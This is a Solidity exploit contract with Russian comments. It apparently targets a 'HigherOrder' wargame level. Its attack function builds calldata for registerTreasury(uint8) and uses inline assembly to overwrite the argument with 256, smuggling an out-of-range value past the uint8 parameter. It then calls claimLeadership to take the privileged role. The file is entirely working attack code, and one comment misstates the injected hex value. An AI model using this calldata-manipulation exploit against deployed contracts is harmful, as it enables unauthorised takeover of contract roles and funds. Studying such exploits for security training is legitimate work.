// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IHigherOrder {
    function registerTreasury(uint8 value) external;

    function claimLeadership() external;
}

contract Exploit {
    function attack(address targetAddress) public {
        IHigherOrder target = IHigherOrder(targetAddress);

        // Вызываем функцию registerTreasury с параметром, которым можно
        // установить значение treasury больше 255
        // Манипулируем calldata, чтобы передать большое значение
        bytes memory payload = abi.encodeWithSignature(
            "registerTreasury(uint8)",
            uint8(0) // На самом деле это значение игнорируется
        );

        // Модифицируем calldata для передачи большого значения вместо uint8
        // assembly используется для подготовки кастомного вызова
        assembly {
            // Устанавливаем значение больше 255 в позиции 4 байта (после селектора функции)
            // 0x0000000000000000000000000000000000000000000000000000000100000000 (большое значение)
            mstore(add(payload, 36), 0x0100)
        }

        // Отправляем модифицированный вызов
        (bool success, ) = targetAddress.call(payload);
        require(success, "registerTreasury failed");

        // Теперь вызываем claimLeadership для получения прав командира
        target.claimLeadership();
    }
}
